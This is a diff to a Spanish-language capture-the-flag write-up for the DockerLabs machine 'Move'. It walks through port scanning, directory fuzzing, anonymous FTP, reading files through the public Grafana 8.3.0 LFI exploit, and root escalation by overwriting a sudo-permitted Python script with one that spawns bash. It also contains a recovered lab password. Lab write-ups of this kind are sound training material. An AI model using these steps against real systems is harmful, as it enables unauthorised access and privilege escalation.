@@ -1,21 +1,22 @@
 # 📘 Informe Técnico - Máquina: *Move*
 
 * **Nivel:** Fácil
-* **Propósito:** 
-* **Objetivo:** 
+* **Propósito:** Práctica de análisis de servicios expuestos, reconocimiento de rutas sensibles y escalada de privilegios.
+* **Objetivo:** Obtener acceso root a través de la explotación de una configuración sudo insegura.
+
 ---
 
 ![Logo](Imágenes/2025-05-15_16-55.png)
 
 ## 🛠️ Despliegue de la Máquina
 
-Iniciamos descargando el archivo comprimido desde DockerLabs. Luego lo descomprimimos con:
+Iniciamos descargando el archivo comprimido desde DockerLabs. Posteriormente lo descomprimimos con el siguiente comando:
 
 ```bash
 unzip move.zip
 ```
 
-Posteriormente, desplegamos la máquina vulnerable usando el siguiente comando:
+Luego desplegamos la máquina vulnerable con:
 
 ```bash
 sudo bash auto_deploy.sh move.tar
@@ -23,8 +24,7 @@ sudo bash auto_deploy.sh move.tar
 
 ![Desplegar](Imágenes/Capturas.png)
 
-
-Verificamos que la máquina esté activa con un `ping` al contenedor:
+Verificamos que el contenedor esté activo mediante un ping:
 
 ```bash
 ping -c1 172.17.0.3
@@ -44,7 +44,7 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt
 
 ![Nmap Puertos](Imágenes/Capturas_2.png)
 
-Luego usamos `extractPorts` para filtrar los puertos detectados y escaneamos con más detalle:
+Luego usamos `extractPorts` para filtrar los puertos abiertos y lanzamos un escaneo más detallado:
 
 ```bash
 nmap -sCV -p80,22,21 172.17.0.3 -oG target.txt
@@ -52,66 +52,167 @@ nmap -sCV -p80,22,21 172.17.0.3 -oG target.txt
 
 ![Nmap detallado](Imágenes/Capturas_3.png)
 
-### 🔍 Resultado:
+### Resultados Destacados:
 
-* **Puerto 80**: Servicio HTTP activo (servidor web).
+* **Puerto 80**: Servicio HTTP (servidor web Apache).
+* **Puerto 22**: Servicio SSH activo.
+* **Puerto 21**: Servicio FTP con acceso anónimo habilitado.
 
-* **Puerto 22**: Servicio SSH activo (servicio SSH).
-
-* **Puerto 21**: Servicio FTP activo (servicio FTP con el usuario Anonymous).
-Nota: Podemos entrar al servico FTP sin necesidad de tener credenciales porque esta activo el usuario Anonymous.
 ---
 
-Entramos http://172.17.0.3/ para ver el servico web y es la pagina defaul de apache2.
+## 🌐 Análisis Web
+
+Accedimos al sitio web [http://172.17.0.3/](http://172.17.0.3/) y se muestra la página por defecto de Apache2.
 
 ![Pagina](Imágenes/Capturas_4.png)
 
-Realice fuzzin con gobuster dir -u http://172.17.0.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
+Realizamos un escaneo de directorios con `gobuster`:
+
+```bash
+gobuster dir -u http://172.17.0.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
+```
 
 ![Fuzzing](Imágenes/Capturas_5.png)
 
-Y se encotro http://172.17.0.3/maintenance.html donde se encontro una ruta /tmp/pass.txt
+Se descubrió el archivo **maintenance.html**, el cual revela una ruta interna:
+
+```
+/tmp/pass.txt
+```
 
 ![Fuzzing](Imágenes/Capturas_6.png)
 
-Entramos al servicio de FTP con el usuario Anonymous y al pedrnos contraseña le damos enter
+---
+
+## 📁 Acceso al Servicio FTP
+
+Accedemos al servicio FTP con el usuario `anonymous`. Al pedir contraseña, simplemente presionamos **Enter**.
+
 ![Fuzzing](Imágenes/Capturas_7.png)
 
-Con ls -la vemos los directorios que hay encontrmos mantenimiento nos movemos con cd mantenimiento y ls -la para verlo sus directorios y encontramos database.kdbx lo descargamos con: get database.kdbx
+Ejecutamos `ls -la` y navegamos hasta el directorio `mantenimiento`, donde encontramos un archivo llamado `database.kdbx`. Lo descargamos con:
+
+```bash
+get database.kdbx
+```
+
 ![Fuzzing](Imágenes/Capturas_8.png)
 
-Despues estube probando puertos que podrian estar abierto y encontre el puerto 3000
+---
+
+## 📡 Detección de Servicios Adicionales
+
+Explorando más puertos, descubrimos que el **puerto 3000** está abierto.
+
 ![Open](Imágenes/Capturas_9.png)
 
-al entrar en la direccion http://172.17.0.3:3000/login nos da una pagina para registranos en grafana y en la parte inferior izquierda podemos notar que esta desactualizado y nos muestra que estamos en la version v8.3.0 (914fcedb7)
+Accedemos a **[http://172.17.0.3:3000/login](http://172.17.0.3:3000/login)** y encontramos una instancia de **Grafana**. En la parte inferior izquierda se muestra la versión:
+
+```
+Grafana v8.3.0 (914fcedb7)
+```
+
 ![Registro](Imágenes/Capturas_10.png)
 
-con el comando: searchsploit Grafana 8.3.0 buscamos algiua vulnerabilidad y encotramos la vulnerabilidad  multiple/webapps/50581.py lo descagamos con searchsploit -m multiple/webapps/50581.py y lo ejecutamos con:
-python3 50581.py -H http://172.17.0.3:3000 nos habre una terminal y ejecutamos un /tmp/pass.txt con la ruta encontrada en uno de los directorios y encontramos una contraseña: t9sH76gpQ82UFeZ3GXZS
+---
+
+## 💥 Explotación de Grafana
+
+Buscamos vulnerabilidades con `searchsploit`:
+
+```bash
+searchsploit Grafana 8.3.0
+```
+
+Identificamos el exploit:
+
+```
+Grafana 8.3.0 - LFI/RCE (Python) → multiple/webapps/50581.py
+```
+
+Lo descargamos y ejecutamos:
+
+```bash
+searchsploit -m multiple/webapps/50581.py
+python3 50581.py -H http://172.17.0.3:3000
+```
+
+Usamos el exploit para leer `/tmp/pass.txt`, y obtenemos una contraseña:
+
+```
+t9sH76gpQ82UFeZ3GXZS
+```
+
 ![contraseña](Imágenes/Capturas_11.png)
 
-Ahora con una contraseña necesitamos un usuario ejecutamos /etc/passwd para buscar usuarios y encontramos:freddy
+---
+
+## 👤 Enumeración de Usuarios
+
+Ejecutamos el comando `cat /etc/passwd` desde el exploit y encontramos un posible usuario válido:
+
+```
+freddy
+```
+
 ![Usuarios](Imágenes/Capturas_12.png)
 
+---
 
-Entre al servicio ftp con estas credenciales y en cd /opt encotre maintenance.py lom descargue con get maintenance.py contenia un print("Server under beta testing") 
+## 🔐 Autenticación Válida y Escalada de Privilegios
+
+Probamos las credenciales encontradas (`freddy:t9sH76gpQ82UFeZ3GXZS`) en el servicio FTP y accedemos exitosamente.
+
+Dentro del directorio `/opt` encontramos el archivo `maintenance.py`, el cual descargamos con:
+
+```bash
+get maintenance.py
+```
+
+El archivo solo contenía:
+
+```python
+print("Server under beta testing")
+```
+
 ![py](Imágenes/Capturas_13.png)
 
-Entre con las credenciales encontradas y ejecute sudo -l que me dio la ubicacion de un script con permisos     (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py accedi a eñ con cd /opt/ lo elimine rm maintenance.py crre un archivo:
-echo 'import os; os.system("/bin/bash")' > /opt/maintenance.py le di privilegios chmod +x /opt/maintenance.py  y lo ejecute sudo /usr/bin/python3 /opt/maintenance.py y accedi a root
+Ya conectados como el usuario `freddy`, ejecutamos:
+
+```bash
+sudo -l
+```
+
+Se nos muestra la siguiente política de sudo:
+
+```
+(ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
+```
+
+Esto indica que podemos ejecutar **ese script como root sin contraseña**.
+
+---
+
+## 🚀 Escalada Final a Root
+
+Eliminamos el script original y creamos uno malicioso:
+
+```bash
+rm /opt/maintenance.py
+echo 'import os; os.system("/bin/bash")' > /opt/maintenance.py
+chmod +x /opt/maintenance.py
+sudo /usr/bin/python3 /opt/maintenance.py
+```
+
+Esto nos otorga una **shell con privilegios root**.
+
 ![root](Imágenes/Capturas_13.png)
 
-Nota probablemete exita otro metodo de resolverlo por datos que recopile.
+---
 
+## 📝 Nota Final
 
-
-
-
-
-
-
-
-
+Es posible que existan otras formas de comprometer esta máquina, pero esta fue la ruta explotada a partir de la información descubierta.
 
 
 
